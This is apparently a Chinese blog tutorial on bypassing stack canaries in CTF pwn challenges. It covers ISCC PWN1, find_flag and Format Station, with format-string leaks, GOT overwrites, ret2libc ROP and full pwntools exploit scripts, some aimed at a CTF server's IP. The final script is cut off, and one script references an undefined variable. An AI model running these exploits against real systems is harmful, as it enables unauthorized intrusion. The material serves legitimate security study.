---
title: Pwn-Canary保护
description: pwn-第3部分Canary保护
date: 2026-05-18 13:08:21
updated: 2026-06-05 18:00:00
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260518052357_f9dcd100baa1cd11728b19b5f745dffcc3cec3fd8755.jpg
categories: [pwn, 安全]
tags: [Canary, 栈溢出, pwn]
recommend: 10
---



## canary知识点介绍

**0x00 文件信息**

```
pwn1: ELF 32-bit LSB executable, Intel 80386, dynamically linked, not stripped
```

- **架构**: 32 位 x86 (i386)
- **保护**: Canary ✅ | NX ✅ | No PIE ❌ | Partial RELRO

既然 **No PIE**，意味着程序中所有函数地址、GOT 地址都是**固定的**，这对我们非常有利。

---

### ISCC-PWN1

题目地址:

#### **0x01 程序分析**

**主要函数**

用 `objdump -d pwn1` 反汇编，可以看明白程序的逻辑。

**main 函数**

```
main:
  call init          → 关闭缓冲
  puts("Hello Hacker!")
  call vuln          → 执行核心逻辑
```

**vuln 函数（关键）**

```
vuln:
  push ebp
  mov ebp, esp
  sub esp, 0x78           ← 分配 120 字节局部变量空间

  mov eax, gs:0x14        ← 读取 canary
  mov [ebp-0xc], eax      ← canary 放在 ebp-12 的位置

  movl $0, [ebp-0x74]     ← i = 0

loop:
  cmp [ebp-0x74], 1
  jle loop_body            ← i <= 1 就继续循环（共 2 次）

loop_body:
  read(0, buf, 0x200)     ← 读最多 512 字节到 buf
  printf(buf)              ← 把 buf 当格式串打印（！！！漏洞）
  i++
  jmp loop

canary_check:
  检查 canary → 通过则 leave; ret
```

**两个漏洞同时存在：**

| 漏洞                 | 位置                                                | 严重程度        |
| -------------------- | --------------------------------------------------- | --------------- |
| **格式化字符串漏洞** | `printf(buf)`                                       | 可读/写任意地址 |
| **栈缓冲区溢出**     | `read(0, buf, 0x200)` 往 112 字节的 buf 读 512 字节 | 可覆盖返回地址  |

而且程序**循环 2 次**，给了我们两次输入机会。

**栈布局**

```
高地址
          +------------------+
ebp+0x04  | 返回地址          |  ← 控制这里就能劫持程序
ebp+0x00  | 保存的 ebp        |
ebp-0x0c  | canary (4字节)    |  ← 必须保持原样，否则 crash
          | ...              |
ebp-0x70  | buf (112字节)     |  ← 我们的输入放这里
ebp-0x74  | 循环变量 i        |
低地址
```

**关键计算：** buf 到 canary 的距离 = `0x70 - 0xC = 0x64 = 100` 字节

**getshell 函数**

```
getshell:
  push "/bin/sh"     ← 地址 0x804a008
  call system
```

地址 **`0x080491c6`**，直接调用 `system("/bin/sh")` 给我们 shell。

---

#### **0x02 思路分析**

既然有两次输入，我们可以：

**方案一：格式化字符串写 GOT（推荐，更优雅）**

**原理：**

1. 第 1 次输入：利用 `printf(buf)` 的格式化字符串漏洞，把 `printf@GOT` 的内容改成 `getshell` 的地址
2. 第 2 次输入：程序再次执行 `printf(buf)`，但此时 printf 已经被替换成 getshell → **直接拿到 shell**

**优点：** 不需要管 canary，不需要算溢出偏移。

**方案二：leak canary + 栈溢出（更经典）**

**原理：**

1. 第 1 次输入：`%31$p` 泄漏 canary

2. 第 2 次输入：构造 payload 覆盖返回地址到 getshell

   ```
   'A'*100 + p32(canary) + p32(fake_ebp) + p32(ret_gadget)*3 + p32(getshell)
   ```

---

##### **格式化字符串漏洞**

**为什么 `printf(buf)` 是漏洞？**

正常用法：`printf("%s", buf)` ← 格式串是固定的

漏洞用法：`printf(buf)` ← 用户输入直接被当作格式串

如果你输入 `%x.%x.%x...`，printf 会从栈上读取数据并打印出来，实现**信息泄漏**。
如果你输入 `%n`，printf 会**往某个地址写入数据**，实现**任意内存写**。

**如何定位我们的输入在 printf 的第几个参数？**

```
发送：AAAAAAAA%6$08x
```

如果打印出来是 `AAAAAAAA41414141`，说明 `AAAAAAAA`（0x41414141）正好在第 6 个参数的位置。这个偏移量在本题中是 6。

**如何泄漏 canary？**

```
发送：%31$p
```

为什么是 31？因为 buf 在 printf 参数中从第 6 位开始，canary 在 buf 上方 100 字节（25 个参数位），`6 + 25 = 31`。

**什么是 fmtstr_payload？**

`pwntools` 的 `fmtstr_payload(offset, writes)` 能自动生成格式化字符串 payload：

```python
payload = fmtstr_payload(6, {printf_got: getshell_addr}, write_size='byte')
```

这行代码的意思：从第 6 个参数开始，把 `printf@GOT` 的内容写成 `getshell` 的地址。`write_size='byte'` 表示逐字节写入（更稳定）。

---

##### **栈溢出时用 `send` 还是 `sendline`？**

这是本题最坑的细节之一。

**send 和 sendline 的区别**

| 函数             | 发送内容                    | 适用场景                         |
| ---------------- | --------------------------- | -------------------------------- |
| `send(data)`     | 只发 data，**不加任何东西** | `read()`                         |
| `sendline(data)` | 发 `data + b'\n'`           | `gets()` / `fgets()` / `scanf()` |

**本题为什么必须用 send？**

`vuln` 函数用 `read(0, buf, 0x200)` 读入数据。 `read()` 是**原始读取**，遇到 `\n` 不会停止，也不会特殊处理。

假设我们的 payload 是 100 + 4 + 4 + 4 + 4 = 116 字节：

- **`send(payload)`** → read 收到 116 字节，正好填满栈布局
- **`sendline(payload)`** → read 收到 117 字节（多了一个 `\n`）

多出来的 1 个 `\n`（0x0a）会覆盖返回地址的第一个字节，整个布局就错位了，程序必崩。

```
栈上本应该是：
|   canary   | fake_ebp  |  ret_gadget  |  getshell  |

用 sendline 后变成：
|   canary   | fake_ebp  |  ret_gadget  |  getshell  |  \n  ↑ 这里！
                                                      read 没读完，
                                                      但 leave;ret 已执行
```

更常见的场景：payload 刚好填满到返回地址，`sendline` 多发的 `\n` 正好覆盖返回地址的**最低一个字节**。

**经验法则：**

- 程序用 `read()` → 用 `send()`
- 程序用 `gets()` / `scanf("%s")` → 用 `sendline()`
- 判断不了 → 先试 `send()`，不行换 `sendline()`

---

#### **0x03 完整 Exploit**

##### **方案一：格式化字符串写 GOT（推荐）**

```python
from pwn import *

HOST = '39.96.193.120'
PORT = 10018
GETSHELL = 0x080491c6      # getshell 函数地址
PRINTF_GOT = 0x0804c014    # printf 的 GOT 表地址

io = remote(HOST, PORT)
io.recvuntil(b'Hello Hacker!')
io.recvline()

# ========== 第 1 次输入 ==========
# 把 printf@GOT 的内容改成 getshell 的地址
# 参数 6：我们的输入在 printf 的第 6 个参数位置
payload = fmtstr_payload(6, {PRINTF_GOT: GETSHELL}, write_size='byte')
io.sendline(payload)   # ← 这里用 sendline 没问题！因为 printf 会解析格式串，
                       #   \n 不影响解析结果

# 收掉 printf 的输出
sleep(1)
io.recv(timeout=5)

# ========== 第 2 次输入 ==========
# 此时 printf@GOT 已经被改成 getshell
# 程序执行 printf(buf) → 实际执行 getshell(buf) → system("/bin/sh")
io.sendline(b'anything')   # 随便发点东西，让 read() 返回

sleep(0.5)

# 验证是否拿到 shell
io.sendline(b'cat /flag*')
print(io.recvall(timeout=3).decode())

io.close()
```

##### **方案二：Leak Canary + 栈溢出**

```python
from pwn import *

HOST = '39.96.193.120'
PORT = 10018
GETSHELL = 0x080491c6      # getshell 函数地址
RET = 0x080492b5            # ret 指令地址（用来凑栈对齐）

io = remote(HOST, PORT)
io.recvuntil(b'Hello Hacker!')
io.recvline()

# ========== 第 1 次输入：泄漏 canary ==========
io.sendline(b'%31$p')              # %31$p 打印 canary
canary_str = io.recvline().strip()
canary = int(canary_str, 16)      # 把字符串 "0xabcdef12" 转成整数
log.success(f'canary = {hex(canary)}')

# ========== 第 2 次输入：栈溢出 ==========
payload = b'A' * 0x64              # 填充 buf 到 canary 的距离（100 字节）
payload += p32(canary)             # canary（保持原样，否则 crash）
payload += p32(RET)                # 覆盖 saved_ebp（随便）
payload += p32(RET) * 3            # ret 滑梯（连跳 3 个 ret）
payload += p32(GET_SHELL)          # 最终跳转到 getshell

io.send(payload)                   # ← 必须用 send！不能用 sendline！
                                   #   多一个 \n 会破坏 payload 布局

io.interactive()                   # 进入交互模式，拿到 shell
```

---

#### **0x04 为什么方案二里要加 `ret*3`？**

这个问题和**栈对齐**有关，但**仅限 64 位**。

在 64 位下，`system()` 内部使用 `movaps` 指令，要求 RSP 16 字节对齐，否则会崩溃。加一个 ret 相当于执行一次 `pop rip`，RSP 就会加 8，翻转对齐状态。

**但在 32 位下，没有 16 字节对齐要求！** 所以这里的 `ret*3` 实际上是**多余的**。payload 只需要：

```
'A'*100 + p32(canary) + p32(随便填) + p32(getshell)
```

加几个 ret 也没坏处，相当于 NOP 滑梯，只是跳转几下什么都不做再进入 getshell。很多 CTFer 从 64 位转 32 位时保留了写 ret 的习惯，不影响效果。

---

#### **0x05 总结**

| 知识点           | 说明                                       |
| ---------------- | ------------------------------------------ |
| 格式化字符串漏洞 | `printf(buf)` — 可读/写任意内存            |
| 栈溢出           | `read()` 读 512 字节到 112 字节的缓冲区    |
| Canary bypass    | 用 `%31$p` 泄漏，然后原样写回              |
| send vs sendline | `read()` 用 `send`，多一个 `\n` 会破坏布局 |
| No PIE           | 地址固定，可以直接用硬编码地址             |
| fmtstr_payload   | pwntools 自动生成格式化字符串写 payload    |

**核心套路总结**

**两道题实际上是一个套路：利用 `printf(buf)` 的格式串漏洞，达到 getshell。**

1. 方法一更直接：既然 printf 会被调用，不如直接把它变成 getshell
2. 方法二更通用：不管程序有没有 getshell 函数，只要能 leak canary + 溢出，就能 ROP

对于新手，推荐先掌握**方法二**（leak canary + 溢出），因为它的思路在更多题目中通用；**方法一**（直接改 GOT）需要目标程序里已经有 getshell 函数，不是总有这么好的条件。

---



### [深育杯 2021] find_flag 题解 PIE

题目连接:https://www.nssctf.cn/problem/774



#### 系统保护机制

> 什么是系统保护机制？

现代 Linux 程序默认开启多种保护，增加利用难度：

| 保护       | 作用                                                     | 本题   |
| ---------- | -------------------------------------------------------- | ------ |
| **PIE**    | 程序每次运行的地址都随机化，无法直接预测函数位置         | ✅ 开启 |
| **Canary** | 栈上放一个"哨兵值"，函数返回前检查它有没有被篡改，防溢出 | ✅ 开启 |
| **NX**     | 栈不可执行，不能直接在栈上写 shellcode                   | ✅ 开启 |
| **RELRO**  | GOT 表只读，不能通过改 GOT 劫持函数                      | Full   |

由于 PIE 开启，我们需要先"泄漏"地址才能知道函数在哪；由于 Canary 开启，我们需要泄漏 Canary 才能绕过栈溢出检测。

什么是格式化字符串漏洞？

```c
printf(user_input);   // 漏洞写法
printf("%s", user_input);  // 安全写法
```

如果直接把用户输入当格式串传给 `printf`，攻击者可以用 `%p`、`%n` 等格式符来**读内存**或**写内存**。

常见格式符：

- `%p`：以十六进制打印一个指针值（8 字节）
- `%k$p`：直接打印第 k 个参数（比如 `%6$p` 打印第 6 个参数）
- `%n`：把已输出的字节数写入某个地址（用于任意写，本题不用）



---

#### **0x01 分析程序**

查看保护

```bash
checksec --file=find_flag
```

输出：

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

保护全开，所以我们需要：**泄漏 Canary + 泄漏地址 → 构造 ROP 链 → 获取 shell/flag**。

反汇编分析

用 IDA 或 `objdump -d` 反汇编：

```
objdump -d find_flag | grep -A 100 "1333:"
```

##### **关键函数（地址 0x132f）分析**

```asm
1333: push   rbp
1334: mov    rbp, rsp
1337: sub    rsp, 0x60           ; 分配 0x60 字节栈空间

; 设置 Canary
133b: mov    rax, fs:0x28        ; 从线程局部存储读 Canary
1344: mov    [rbp-0x8], rax      ; 存到 rbp-0x8

; 第一次输入（格式化字符串漏洞）
134a: lea    rdi, "Hi! What's your name? "
1356: call   printf              ; 打印提示
135b: lea    rax, [rbp-0x60]     ; buffer1 = rbp-0x60
1367: call   gets                ; gets(buffer1) —— 第一次读入
136c: lea    rdi, "Nice to meet you, "
1378: call   printf              ; 打印 "Nice to meet you, "
137d~13ab: 计算字符串长度，末尾拼上 "!\n"
13af: lea    rax, [rbp-0x60]
13b3: mov    rdi, rax
13bb: call   printf              ; printf(buffer1) ★ 格式化字符串漏洞！

; 第二次输入（栈溢出）
13c0: lea    rdi, "Anything else? "
13cc: call   printf              ; 打印提示
13d1: lea    rax, [rbp-0x40]     ; buffer2 = rbp-0x40
13dd: call   gets                ; gets(buffer2) —— 第二次读入 ★ 栈溢出！

; Canary 检查
13e3: mov    rax, [rbp-0x8]      ; 取出栈上的 Canary
13e7: xor    rax, fs:0x28        ; 和原始 Canary 比较
13f0: je     13f7                ; 相等则跳过
13f2: call   __stack_chk_fail    ; 不等则报错退出！
13f7: leave                      ; 恢复栈
13f8: ret                        ; 返回
```

---

##### **辅助函数分析**

win 函数（地址 0x1229）：

```asm
1229: endbr64
122d: push   rbp
122e: mov    rbp, rsp
1231: lea    rdi, "/bin/cat flag.txt"   ; 参数
1238: call   system                     ; system("/bin/cat flag.txt")
123d: nop
123e: pop   rbp
123f: ret
```

这个函数就是我们的目标——跳转到它就能执行 `cat flag.txt` 拿到 flag。

栈布局

```
        buffer1     buffer2       canary    saved RBP   返回地址
        (32B)       (32B)         (8B)      (8B)        (8B)
      |-----------|-------------|---------|-----------|-----------|
rbp→  -0x60       -0x40        -0x8      0x0         +0x8
                               ★                  ★
                           需要泄漏          需要泄漏
```

---

#### **0x02 攻击思路**

分两步走：

##### Step 1：泄漏 Canary 和 PIE 基址

利用第一次输入的**格式化字符串漏洞**，用 `%p` 读取栈上的值。

关键推导：

- buffer1 在 `rbp-0x60`
- Canary 在 `rbp-0x08`
- 两者距离：`0x60 - 0x08 = 0x58 = 88 字节 = 11 个 qword`

当 `printf(buffer1)` 被调用时：

- `%1$p`~`%5$p` 读寄存器 RSI~R9
- `%6$p` 读**栈上第 1 个位置 = buffer1 开头**
- `%6+11$p` = **`%17$p` = Canary**

同理，返回地址在 `rbp+0x08`，距 buffer1 共 `0x68 / 8 = 13` 个 qword：

- **`%6+13$p` = `%19$p` = 返回地址**
- 返回地址是 `main+0x146f`，**减去 0x146f 就是 PIE 基址**

有了 PIE 基址，就能计算出 win 函数的真正地址（`基址 + 0x1229`）。

---



##### Step 2：栈溢出跳转到 win 函数

第二次输入用 `gets(buffer2)`，构造 payload：

```
buffer2 → [  0x38 填充  ][  Canary  ][  假 RBP  ][  ret  ][  win  ]
          rbp-0x40       rbp-0x8    rbp+0x0      rbp+0x8 rbp+0x10
                         ↓           ↓            ↓        ↓
                      原样填回      任意值       ret对齐    win 地址
```

为什么加一个 `ret` 在前面？因为 `system()` 内部有 `movaps` 指令，要求 RSP 16 字节对齐。加一个 `ret` 让 RSP 多移动 8 字节，调整对齐。

---

#### **0x03 编写 Exploit（逐行讲解）**

首先安装 pwntools（Python 的 PWN 工具库）：

```bash
pip install pwntools
```

然后创建 `exploit.py`：

```python
from pwn import *    # 导入 pwntools 所有功能

# 设置目标架构为 amd64（64位）
context.arch = 'amd64'
# 日志级别设为 info（显示成功/错误信息，少一些干扰）
context.log_level = 'info'

# 加载 ELF 文件，获取符号信息
elf = ELF('./find_flag')

# 连接程序（本地测试用 process，打远程用 remote）
p = process('./find_flag')
# p = remote('node5.anna.nssctf.cn', 28586)  # 远程靶机
```

##### 第 1 步：泄露 Canary 和 PIE 基址

```python
# 等待程序输出 "Hi! What's your name? "，然后发送 payload
p.recvuntil(b"name? ")        # recvuntil = 一直收，直到遇到指定字符串

# %17$p 读第 17 个参数 → Canary
# %19$p 读第 19 个参数 → 返回地址
payload1 = b"%17$p.%19$p"

p.sendline(payload1)           # 发送 payload 并回车

# 程序会打印: "Nice to meet you, 0xCANARY.0xRETADDR!\n"
# 我们收 "Nice to meet you, " 之后的内容
p.recvuntil(b"Nice to meet you, ")
data = p.recvuntil(b"!\n", drop=True)  # 收直到 "!\n"，drop=True 去掉 "!\n"

# data 的内容类似: b"0xabcd1234.0x5678ef00"
# 用 . 分割成两部分
canary_str, ret_str = data.split(b".")

# 把十六进制字符串转成整数
canary = int(canary_str, 16)    # 第 1 个 = Canary
ret_addr = int(ret_str, 16)      # 第 2 个 = 返回地址

# 返回地址 = main+0x146f，所以 PIE 基址 = 返回地址 - 0x146f
pie_base = ret_addr - 0x146f

# 有了基址就能算出 win 函数的真实地址
win_addr = pie_base + 0x1229

# 用于栈对齐的 ret gadget
ret_gadget = pie_base + 0x13f8

# 打印出来看看
log.success(f"Canary: {hex(canary)}")        # 绿色输出
log.success(f"PIE base: {hex(pie_base)}")
log.success(f"Win addr: {hex(win_addr)}")
```

##### 第 2 步：构造栈溢出 payload

```python
# 等待第二个提示
p.recvuntil(b"Anything else? ")

# 构造 payload：
# - 0x38 字节填充（从 buffer2 到 canary）
# - Canary（原样写回，绕过检查）
# - 8 字节假 RBP（任意值）
# - ret gadget（修复栈对齐）
# - win 函数地址
payload2 = b"A" * 0x38          # 填充 56 字节
payload2 += p64(canary)         # Canary（8 字节，小端序）
payload2 += b"B" * 8            # 假 RBP（8 字节）
payload2 += p64(ret_gadget)     # ret gadget（对齐用）
payload2 += p64(win_addr)       # win 函数地址

p.sendline(payload2)            # 发送 payload

# 进入交互模式，拿到 flag
p.interactive()
```

##### 完整脚本

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./find_flag')
p = process('./find_flag')
# p = remote('node5.anna.nssctf.cn', 28586)

# ======== Step 1: Leak ========
p.recvuntil(b"name? ")
p.sendline(b"%17$p.%19$p")

p.recvuntil(b"Nice to meet you, ")
data = p.recvuntil(b"!\n", drop=True)
canary_str, ret_str = data.split(b".")

canary = int(canary_str, 16)
ret_addr = int(ret_str, 16)

pie_base = ret_addr - 0x146f
win_addr = pie_base + 0x1229
ret_gadget = pie_base + 0x13f8

log.success(f"Canary: {hex(canary)}")
log.success(f"PIE base: {hex(pie_base)}")
log.success(f"Win addr: {hex(win_addr)}")

# ======== Step 2: Overflow ========
p.recvuntil(b"Anything else? ")
payload2 = b"A" * 0x38 + p64(canary) + b"B" * 8 + p64(ret_gadget) + p64(win_addr)
p.sendline(payload2)

p.interactive()
```

---

#### 0x04 调试辅助：用 GDB 验证

推荐用 GDB + pwndbg 插件来观察内存。

下断点

```bash
gdb ./find_flag
start                    # 启动程序，停在入口点
b *$rebase(0x13bb)       # 断在 printf(buffer1) 处，$rebase 自动加 PIE 基址
c                        # 继续运行
```

输入测试 payload

程序提示 `name?` 后输入：

```
AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

观察栈

```gdb
stack 40      # 或 telescope $rsp 30
```

输出中能看到：

- `arg[6]: 0x252e702541414141` = `AAAA%p.%`（你的输入在 `%6$p`）
- `arg[17]: 0x????...??00` = Canary（最低字节是 0x00）
- `arg[19]: 0x5555...146f` = 返回地址

验证 Canary

```gdb
p/x 0x????...??00 & 0xff    # 结果应为 0x00，证明是 Canary
```

---

#### 0x05 常见问题

Q：为什么是 `%17$p` 不是别的？

buffer1 在 `rbp-0x60`，Canary 在 `rbp-0x08`。距离 = `0x58` 字节 = 11 个 qword。`%6$p` 读 buffer1 开头，所以 `%6+11$p` = `%17$p`。

Q：为什么要加一个 `ret` 在 win 前面？

`system()` 内部用 `movaps` 要求 RSP 16 字节对齐。不加 ret 时 RSP 可能不对齐，程序崩溃。

Q：为什么不用 `system("/bin/sh")` 而用 `cat flag.txt`？

因为 win 函数里已经写死了 `/bin/cat flag.txt`，我们只能跳过去执行它。题目设计如此。

Q：`p64()` 是什么？

pwntools 的函数，把整数转为 8 字节的**小端序**字节串。x86-64 是小端序（低位字节放低地址）。例如 `p64(0x1234)` → `b"\x34\x12\x00\x00\x00\x00\x00\x00"`。

Q：`recvuntil(drop=True)` 有什么用？

`drop=True` 表示**不包含**匹配的字符串在结果里。`recvuntil(b"!\n", drop=True)` 会收 `!` 之前的所有内容，`!\n` 被丢弃。

---

## [Zero-G 2026] Format Station

### 0x01 题目分析

#### 文件信息

```asm
format_station: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
```

保护全开，但没有PIE，所以代码段地址固定。

---



#### 反汇编分析

##### **main函数**

```asm
main:
  call init_io        ; 关闭缓冲
  call vuln           ; 漏洞函数
```

##### **vuln函数（关键）**

![img](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154553302-1277060360.png)

```asm
vuln:
  sub rsp, 0xe0
  mov [rbp-0x8], canary     ; 存储canary
  call read_canary           ; 从TLS读取canary到rax
  mov [rbp-0xe0], rax       ; 保存canary值

  ; 打印提示
  puts "ZeroG Format Station"
  puts "Send your format beacon:"

  ; 第一次read：格式化字符串漏洞
  lea rsi, [rbp-0x90]       ; 缓冲区1（format beacon）
  mov rdx, 0x7f             ; 最多读127字节
  call read

  ; printf漏洞！
  mov rdi, [rbp-0x90]       ; 格式字符串
  mov rsi, [rbp-0xe0]       ; 参数1 = canary
  mov rdx, 0x401080         ; 参数2 = puts@plt地址
  call printf               ; 格式化字符串漏洞！

  puts "Send your access packet:"

  ; 第二次read：栈溢出
  lea rsi, [rbp-0xd0]       ; 缓冲区2（access packet）
  mov rdx, 0x100            ; 最多读256字节
  call read

  ; canary检查 + 返回
  leave
  ret
```

---



#### 栈布局

```asm
[rbp-0xe0]  canary值（read_canary返回值）
[rbp-0xd0]  缓冲区2（access packet）← 第二次read
[rbp-0x90]  缓冲区1（format beacon）← 第一次read（printf格式字符串）
[rbp-0x8]   canary备份
[rbp]       saved rbp
[rbp+0x8]   返回地址
```

**偏移量计算：**

- 缓冲区2 → canary：0xd0 - 0x8 = 0xc8
- 缓冲区2 → 返回地址：0xd0 + 0x8 = 0xd8

---

### 0x02 漏洞点

1. **格式化字符串漏洞**：`printf(buffer, canary, puts@plt)` — 用户输入的buffer作为格式字符串
2. **栈溢出**：第二次read读取0x100字节到0xd0大小的缓冲区，可以覆盖返回地址

---



### 0x03 利用思路

#### 阶段1：泄露canary

利用格式化字符串`%1$016lx`泄露canary（printf的第一个参数）。

```
输入: %1$016lx.%2$p
输出: d48ad7a33fbf2400.0x401080
         ↑canary        ↑puts@plt（固定地址，无用）
```

---



##### 扩展printf参数打印调用

::alert{type="question"}
为什么必须使用%格式化字符串才能打印出canary和puts的数据
::

因为 printf 是用可变参数（variadic arguments）实现的

在 x86-64 上，函数调用时参数放在寄存器里：

```c  
printf(fmt, canary, puts@plt)
          ↓      ↓        ↓
         rdi    rsi      rdx
```

printf 内部的逻辑大致是这样的：

```c
 void printf(const char *fmt, ...) {
      va_list args;
      va_start(args, fmt);    // args 指向 rsi（canary）的位置

      while (*fmt) {
          if (*fmt == '%' && *(fmt+1) == 'd') {
              int val = va_arg(args, int);  // 从 args 位置取一个值，然后 args 往后移
              print_int(val);
          } else if (*fmt == '%' && *(fmt+1) == 's') {
              char *s = va_arg(args, char*);
              print_string(s);
          } else {
              putchar(*fmt);  // 普通字符直接输出，不读参数
          }
          fmt++;
      }
  }
```

- va_start(args, fmt) 让 args 指向 rsi 寄存器的位置（canary）
  - 每遇到一个 % 格式符，va_arg 就从 args 读取下一个值，然后指针后移
  - 普通字符直接输出，不读参数
- 所以：
  - 输入 "hello" → 遍历完所有字符，一次都没调用 va_arg，canary 和 puts 根本没被读取
  - 输入 "%1$lx" → 调用 va_arg，从 rsi（canary）的位置读出值并打印

---

printf 的缺陷：

       1. 它不检查格式化字符串要求的参数数量是否和实际传入的一致
       2. 它不检查格式化字符串是否来自可信来源
       3. 它只是机械地按 % 符号从寄存器/栈上取值



---



#### 阶段2：泄露libc地址

用canary + ROP调用`puts(puts@GOT)`，泄露puts在libc中的真实地址。

```
ROP链: padding(0xc8) + canary + padding(8) + pop_rdi_ret + puts@GOT + puts@plt + main
```

为什么返回main而不是vuln？因为返回vuln时rbp是垃圾值，vuln内部的`mov [rbp-0xe0], rax`会写入无效地址导致SIGSEGV。

---



#### 阶段3：计算libc基址 + ret2system

```
libc_base = puts真实地址 - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + 下一个"/bin/sh"的偏移
```

ROP链需要一个`ret`做栈对齐（16字节对齐要求）：

```
ROP链: padding(0xc8) + canary + padding(8) + ret + pop_rdi_ret + bin_sh + system
```

---

#### 阶段4：链接动态数据

::alert{type="question"}
为什么要动态链接？
::



因为程序编译时，puts、printf、system 这些函数不在你的程序里，它们在 libc.so.6
  这个库里。

  静态链接 vs 动态链接

  静态链接: 把 libc 的代码整个复制到你的程序里
            程序体积大，但可以独立运行

  动态链接: 程序里只留一个"占位符"，运行时再去 libc.so.6 里找真正的代码
            程序体积小，多个程序可以共享同一个 libc

  本题为什么必须用动态链接

  看一下程序里的调用：

```python
  printf(buf, canary, puts@plt);
  //      ↓
  //      puts@plt 这个地址在程序自己的代码段里
  //      但真正的 puts 代码在 libc.so.6 里
```



  动态链接的机制：

  程序里的 puts@plt（0x401080）:
      这不是真正的 puts 函数
      这是一个"跳板"，里面只有一条 jmp 指令
      跳到 GOT 表里记录的真实地址

  GOT 表（puts@GOT）:
      程序第一次调用 puts@plt 时
      动态链接器（ld-2.36.so）把 puts 在 libc 里的真实地址填到这里
      以后每次调用就直接跳过去

```
  程序调用 puts
      ↓
  进入 puts@plt（跳板，固定地址 0x401080）
      ↓
  查 GOT 表（存着 puts 的真实 libc 地址）
      ↓
  跳转到 libc.so.6 里的 puts 真实代码
      ↓
  执行 puts，返回

  本题的利用原理

  正是因为动态链接，GOT 表里存着 libc 的真实地址，我们才能泄露
```

```
阶段2: ROP 调用 puts(puts@GOT)
         ↓
         GOT 表里存着: 0x7f1234567980（puts 在 libc 中的真实地址）
         ↓
         把这个值泄露出来
         ↓
  阶段3: libc_base = 0x7f1234567980 - libc中puts的偏移
         system = libc_base + system的偏移
         /bin/sh = libc_base + /bin/sh的偏移
```

  如果程序是静态链接的，就没有 GOT 表，就没有办法通过泄露 GOT 来获取 libc
  基址，ret2libc 攻击就做不了。

---

##### 动态链接的完整流程

```
 你敲 ./format_station
      ↓
  内核加载程序到内存
      ↓
  看到程序头部写着: "我要 ld-2.36.so 来帮我链接"
      ↓
  内核先加载 ld-2.36.so（动态链接器）
      ↓
  把控制权交给 ld-2.36.so
      ↓
  ld-2.36.so 做这些事:
      1. 加载 libc.so.6 到内存
      2. 找到 puts、printf、system 在 libc 里的地址
      3. 把这些地址填到程序的 GOT 表里
      4. 跳到程序的 main 开始执行
      ↓
  程序运行时:
      调用 puts@plt → 查 GOT 表 → 跳到 libc 里的 puts
```

  动态链接器是什么？



  动态链接器 = ld-2.36.so（一个特殊的可执行文件）

  它的作用:
      在程序启动时，把 libc.so.6 加载进来
      把函数的真实地址填到 GOT 表
      让程序能正常调用 libc 函数

---

  为什么要 patchelf?

  ```
原程序写的: "我要 /lib64/ld-linux-x86-64.so.2"
                  ↑ 系统默认的动态链接器
  ```



  但本题给的 libc 是 2.36 版本
  系统默认的链接器可能是其他版本
  版本不匹配 → 地址算错 → exploit 崩溃

  所以:

```bash
patchelf --set-interpreter ./ld-2.36.so format_station
      ↓
      改成: "我要当前目录下的 ld-2.36.so"
      ↓
      保证链接器和 libc 版本一致
```

​     

  总结

  程序启动需要两样东西:
      1. format_station（程序本身）
      2. ld-2.36.so（动态链接器，负责加载 libc 并填 GOT 表）

  patchelf 的作用:
      告诉程序 "用这个 ld-2.36.so 来链接，别用系统的"
      避免链接器版本和 libc 版本不匹配

  没有动态链接器，程序启动时就不知道去哪找 libc，GOT 表也不会被填充，调用 libc
  函数就会崩溃。

---

##### 几种方法确认连接器版本

方法1：readelf

```bash
readelf -l format_station | grep interpreter
```



输出：

```lua
[Requesting program interpreter: ./ld-2.36.so]
```

方法2：file

file format_station

输出里会有一段：
interpreter ./ld-2.36.so

方法3：直接看程序头部

readelf -l format_station

输出：

```lua
Program Headers:
 Type           Offset             VirtAddr           PhysAddr
                FileSiz            MemSiz              Flags  Align
 INTERP         0x0000000000000318 0x0000000000400318 0x0000000000400318
                0x000000000000001c 0x000000000000001c  R      0x1
     [Requesting program interpreter: ./ld-2.36.so]
                   ↑ 这就是它要的动态链接器
```

本题的情况

原程序要求的链接器: ./ld-2.36.so（已经用 patchelf 设置好了）

如果没 patchelf，一般会是:
   /lib64/ld-linux-x86-64.so.2     （64位系统默认）
   /lib/ld-linux.so.2              （32位系统默认）

什么时候需要 patchelf

readelf -l 看到的链接器    实际目录下的链接器     需要patchelf吗  ─────────────────────────────────────────────────────────────
/lib64/ld-linux-x86-64.so.2   系统有这个             不需要
./ld-2.36.so                  当前目录有这个          不需要（已设置好）
/lib64/ld-linux-x86-64.so.2   只有 ./ld-2.36.so      需要！



  一句话：拿到题先 readelf -l
  看链接器是什么，再看题目给的文件里有没有这个链接器，没有就用 patchelf 改。

```bash
readelf -l format_station | grep interpreter
```

![image-20260524153235110](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154552908-948675362.png)

好问题，现在我怎么确定是什么系统版本的呢？

看一下题目给的libc

```bash
strings libc.so.6 | grep "stable release"
```

![image-20260524153550214](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260524154552554-1932717418.png)

知道是 Debian 12 + glibc 2.36 后：

用 glibc-all-in-one 工具

```bash
git clone https://github.com/nickglibc/glibc-all-in-one.git
cd glibc-all-in-one
./build 2.36
```

>实际流程
>
>第一步：自己确认 libc 版本
>
>
>
>strings libc.so.6 | grep "GLIBC"
>
>
>
>输出: GLIBC 2.36
>
>
>
>第二步：告诉 glibc-all-in-one 要 2.36
>
>
>
>./download 2.36       # 下载预编译好的 或  ./build 2.36          # 自己编译
>
>
>
>第三步：它会下载对应的 ld.so 和 libc.so.6 到某个目录
>
>你再拷出来用
>
>



也可以用libc.rip

::alert{icon="ph:files-duotone" color="var(--c-accent)" title="libc查询"}

https://libc.rip/

::






### 0x04 完整Exploit

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./format_station')
libc = ELF('./libc.so.6')

r = process('./format_station')

ret = 0x4013bc
